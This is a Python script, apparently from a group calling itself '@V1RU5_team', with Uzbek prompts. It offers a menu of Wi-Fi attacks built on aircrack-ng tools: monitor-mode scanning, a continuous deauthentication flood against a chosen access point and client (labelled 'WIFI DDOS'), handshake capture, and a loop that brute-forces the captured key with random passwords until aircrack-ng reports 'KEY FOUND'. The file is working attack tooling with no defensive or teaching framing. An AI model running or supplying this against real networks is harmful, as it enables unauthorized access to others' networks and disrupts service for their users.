import subprocess
import string
import random
from datetime import datetime






print('''
██╗░░░██╗░░███╗░░██████╗░██╗░░░██╗███████╗████████╗███████╗░█████╗░███╗░░░███╗
██║░░░██║░████║░░██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗░████║
╚██╗░██╔╝██╔██║░░██████╔╝██║░░░██║██████╗░░░░██║░░░█████╗░░███████║██╔████╔██║
░╚████╔╝░╚═╝██║░░██╔══██╗██║░░░██║╚════██╗░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
░░╚██╔╝░░███████╗██║░░██║╚██████╔╝██████╔╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝''')
print('''Bu tool @V1RU5_team tomonidan yaratildi''')
print('''                   _______________________________________________________________________
                   |                                                                      |
                   |  [1]   ---------------      WIFI SCAN         ---------------        |
                   |  [2]   ---------------     WIFI HASHCAT       ---------------        |
                   |  [3]   ---------------      WIFI DDOS          ---------------        |
                   |  [4]   ---------------   PASSEORD HACKING     ---------------        |
                   |______________________________________________________________________| ''')





def main():
    subprocess.call("airmon-ng start wlp0s20f0u3", shell=True)
    subprocess.call("airodump-ng wlp0s20f0u3", shell=True)

def ddos():
    wifi_mac = input("wifi mack adresi ==> ")
    wifi_x = input("foydalanuvchi mack adresi ==> ")
    subprocess.call(f"sudo aireplay-ng --deauth 0 -a {wifi_mac} -c {wifi_x} wlp0s20f0u3", shell=True)

def hashcat2():
    wifi_mac = input("wifi mack adresi ==> ")
    wifi_channel = int(input("wifi channel ==> "))
    wifi_cap = input("wifi uchun [file].cap nomi ")
    subprocess.call(f"sudo airodump-ng --channel {wifi_channel} --bssid {wifi_mac} --write {wifi_cap} wlp0s20f0u3", shell=True)

def generate_password(length=8, characters=string.ascii_letters + string.digits + string.punctuation):
    password = ''.join(random.choice(characters) for i in range(length))
    return password

def write_password_to_file(password, filename):
    with open(filename, 'w') as file:
        file.write(password + '\n')

zx = int(input(" ====> "))
if zx == 1:
    main()
elif zx == 2:
    hashcat2()
elif zx == 3:
    ddos()
else:
    custom_chars = input("Parollar uchun belgilar: ")
    password_length = int(input("Parollar nechta belgidan tashkil topishi kerak: "))
    wifi_pass = input("Parollar file nomi ==> ") 
    wifi_cap = input("Wifi uchun [file].cap nomi ")
    while True:
        password = generate_password(length=password_length, characters=custom_chars)
        write_password_to_file(password, wifi_pass)
        start_time = datetime.now() 
        result = subprocess.run(f"aircrack-ng -w {wifi_pass} {wifi_cap}", shell=True, capture_output=True, text=True) 
        end_time = datetime.now()
        elapsed_time = (end_time - start_time).total_seconds() 
        if "KEY FOUND" in result.stdout:
            print(f"Kalit topildi! Parol: {password}. Vaqt: {elapsed_time:.2f} soniya") 
            break 
        else: 
            print(f"Notug'ri parol: {password}. Vaqt: {elapsed_time:.2f} soniya")
